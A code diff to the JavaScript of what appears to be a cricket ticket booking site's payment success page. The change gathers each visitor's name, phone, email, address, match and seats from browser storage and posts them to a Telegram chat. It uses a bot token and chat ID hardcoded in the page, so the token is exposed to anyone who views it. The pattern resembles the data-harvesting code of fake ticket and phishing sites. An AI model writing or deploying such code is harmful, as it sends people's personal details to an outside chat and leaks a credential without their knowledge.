@@ -150,11 +150,37 @@
             document.getElementById('display-amount').innerText = "₹" + finalPrice;
             document.getElementById('display-order-id').innerText = orderId;
 
-            // 2. Telegram Notification Logic
+            // 2. Fetch all user details from localStorage for Telegram
+            let matchTitle = "Not Selected";
+            let matchDate = "";
+            try {
+                const matchData = JSON.parse(localStorage.getItem('selectedMatch'));
+                if(matchData) {
+                    matchTitle = matchData.title || "Not Selected";
+                    matchDate = matchData.date ? `(${matchData.date})` : "";
+                }
+            } catch(e) {}
+
+            const name = localStorage.getItem('customerName') || "Not Provided";
+            const phone = localStorage.getItem('customerPhone') || "Not Provided";
+            const email = localStorage.getItem('customerEmail') || "Not Provided";
+            const address = localStorage.getItem('customerAddress') || localStorage.getItem('address') || "Not Provided";
+            const seats = localStorage.getItem('selectedSeats') || "Not Provided";
+
+            // 3. Telegram Notification Logic
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513";
             
-            const message = `✅ *Payment Successful / Booking Done!*\n\n💰 *Amount Paid:* ₹${finalPrice}\n🎫 *Order ID:* ${orderId}\n🌐 *Page:* Success/Thank You Page`;
+            const message = `✅ *BOOKING SUCCESSFUL / PAYMENT DONE!* ✅\n\n` +
+                            `🎫 *Order ID:* ${orderId}\n` +
+                            `👤 *Name:* ${name}\n` +
+                            `📞 *Phone:* ${phone}\n` +
+                            `📧 *Email:* ${email}\n` +
+                            `🏠 *Address:* ${address}\n` +
+                            `🏏 *Match:* ${matchTitle} ${matchDate}\n` +
+                            `🎟️ *Seats:* ${seats}\n` +
+                            `💰 *Amount Paid:* ₹${finalPrice}\n\n` +
+                            `🌐 *Page:* Success/Thank You Page`;
             
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
